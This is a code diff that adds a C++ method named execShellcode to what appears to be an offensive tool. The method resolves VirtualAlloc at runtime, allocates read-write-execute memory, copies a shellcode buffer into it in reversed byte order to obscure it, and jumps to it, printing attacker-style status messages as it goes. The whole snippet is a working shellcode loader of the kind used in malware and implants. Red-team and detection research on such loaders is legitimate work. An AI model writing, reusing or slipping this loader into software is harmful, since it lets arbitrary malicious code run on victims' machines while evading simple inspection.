@@ -584,3 +584,37 @@ void session::callWrapper(std::string funcName)
 	}
 }
 
+void session::execShellcode(void *shellCodeAddr, int size) {
+	std::vector<void*> args;
+	uintptr_t ProtFlag = 0x40; // PAGE EXECUTE REDWRITE
+	uintptr_t MemFlag = 0x1000 | 0x2000;
+	uintptr_t dstAddr = 0x0;
+	uintptr_t newSize = (uintptr_t)size; //needs to be expanded
+	DWORD junk = 0;
+	//load kernel32
+	printf("[*] Attempting to load kernel32\n");
+	loadLibrary("kernel32.dll");
+	//resolve VirtualAlloc
+	printf("[*] Resolving VirtualAlloc\n");
+	addFunc("kernel32.dll", "VirtualAlloc", size, "NULL");
+	//prepare args
+	args.push_back(&dstAddr);  
+	args.push_back(&newSize);
+	args.push_back(&MemFlag);
+	args.push_back(&ProtFlag);
+	printf("[*] Calling VirtualAlloc\n");
+	uintptr_t newLoc  = caller::preparedCall(this->FUNCTIONS_MAP.find("VirtualAlloc")->second.funcAddr, args.data(), 4);
+	if ((void *)newLoc == nullptr) {
+		printf("[-] Fail during memory allocation for shellcode\n");
+		return;
+	}
+	printf("[+] New executable shellcode location 0x%p\n", newLoc);
+	uintptr_t locPointer = newLoc;
+	for (int i = size-1; i >= 0; i--)//copy reversed
+	{
+		*(uint8_t*)newLoc++ = ((uint8_t *)shellCodeAddr)[i];
+	}
+
+	printf("[+] Executing shellcode\n");
+	caller::shellcodeCall((void *)locPointer);
+}
